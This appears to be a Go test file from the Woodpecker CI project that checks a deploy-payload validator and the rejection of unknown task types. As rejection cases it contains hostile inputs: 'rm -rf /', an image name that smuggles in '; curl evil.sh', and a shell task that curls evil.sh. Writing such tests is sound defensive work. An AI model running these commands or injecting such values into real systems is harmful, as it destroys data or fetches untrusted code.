// Copyright 2026 Woodpecker Authors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package core

import (
	"context"
	"testing"

	"github.com/stretchr/testify/assert"

	"go.woodpecker-ci.org/woodpecker/v3/server/model"
)

func TestValidateDeployPayloadWhitelist(t *testing.T) {
	valid := deployPayload{
		Action:  "deploy",
		Image:   "ghcr.io/acme/backend-api",
		Digest:  "sha256:8dcf1c3a9d01",
		Runtime: "docker",
	}
	assert.NoError(t, validateDeployPayload(valid))

	// Reject non-deploy actions.
	assert.Error(t, validateDeployPayload(deployPayload{Action: "rm -rf /"}))

	// Reject mutable / missing digest.
	assert.Error(t, validateDeployPayload(deployPayload{Action: "deploy", Image: "ghcr.io/acme/backend-api", Digest: "latest"}))
	assert.Error(t, validateDeployPayload(deployPayload{Action: "deploy", Image: "ghcr.io/acme/backend-api"}))

	// Reject image references with shell metacharacters.
	assert.Error(t, validateDeployPayload(deployPayload{Action: "deploy", Image: "image; curl evil.sh", Digest: "sha256:abc"}))
}

func TestExecuteTaskUnknownTypeRejected(t *testing.T) {
	task := &model.NodeTask{Type: "shell", Payload: `{"cmd":"curl evil.sh"}`}
	_, err := executeTask(context.Background(), task)
	assert.Error(t, err)
}
